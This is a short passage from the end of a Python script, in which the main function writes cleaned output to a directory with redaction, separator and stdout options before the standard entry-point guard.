    write_outputs_grouped(cleaned, outdir=Path(args.outdir), redact=args.redact, sep=args.sep, also_stdout=args.stdout)

if __name__ == "__main__":
    main()
